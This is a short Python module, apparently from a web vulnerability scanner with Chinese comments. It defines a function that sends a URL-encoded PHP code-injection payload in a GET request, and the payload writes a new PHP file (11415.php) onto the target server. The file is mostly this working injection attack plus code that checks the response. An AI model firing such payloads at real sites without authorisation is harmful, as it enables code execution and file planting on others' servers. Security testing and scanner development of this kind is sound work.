import requests
import re
from .utils import make_request_with_timeout, process_attack_response


def attack_php(url, headers, pattern, success, fail, error):
    """
    PHP代码注入攻击测试
    """
    # 定义 PHP 代码注入恶意 payload
    data = {
        "a": "fetch",
        "content": "%3C?php+file_put_contents(%2211415.php%22,%22%3C?php+echo+1745189061%3B%22)%3B"
    }

    # 发送请求
    success_flag, response_or_error, status_code = make_request_with_timeout(
        url, headers, method='GET', params=data
    )
    
    # 处理响应
    return process_attack_response(
        "PHP代码注入", success_flag, response_or_error, status_code, 
        pattern, success, fail, error
    )
